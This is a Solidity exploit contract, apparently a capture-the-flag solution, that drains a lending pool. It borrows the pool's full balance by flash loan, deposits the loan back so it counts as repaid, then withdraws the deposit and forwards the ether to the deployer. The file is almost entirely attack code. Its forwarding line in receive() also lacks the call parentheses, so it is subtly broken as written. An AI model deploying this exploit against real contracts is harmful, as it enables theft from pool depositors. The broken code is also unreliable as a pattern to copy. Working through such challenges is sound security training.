// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideAttack {
    IPool immutable pool;
    address immutable attacker;
    constructor(address _pool) {
        pool = IPool(_pool);
        attacker = msg.sender;
    }

    function attack() public {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
    }
    
    function execute() payable external{
        pool.deposit{value: msg.value}();
    }

    receive() payable external {
        payable(attacker).call{value: address(this).balance};
    }

}